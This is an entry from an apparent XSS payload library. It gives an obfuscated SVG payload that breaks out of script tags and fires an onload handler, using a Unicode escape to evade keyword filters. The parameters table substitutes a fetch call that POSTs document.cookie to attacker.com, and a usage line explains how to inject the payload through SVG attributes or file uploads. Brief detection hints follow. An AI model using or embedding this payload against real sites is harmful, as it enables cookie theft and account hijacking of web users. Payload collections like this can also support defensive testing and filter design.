---
id: 122348fb-99e7-45d6-9b51-990326c0ab01
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286251+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - svg
  - obfuscated
platforms:
  - Web
validated: true
---

# SVG-XSS-with-Obfuscated-Onload

## Code

```javascript
-->'\"/"></sCript><svG x=\">\" onload=(co\u006efirm)``>
```

## Description

Obfuscated SVG payload using Unicode escapes and tag breaking to close scripts and open SVG with onload confirm, evading keyword-based filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| co\u006efirm | Obfuscated 'confirm'; replace | onload=fetch('http://attacker.com', {method:'POST',body:document.cookie}) |

## Usage

Inject into SVG attributes or embed in files for upload vulnerabilities; triggers on load.

## Detection

- Unicode escapes like \u006e in SVG.
- Unexpected onload in image contexts.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
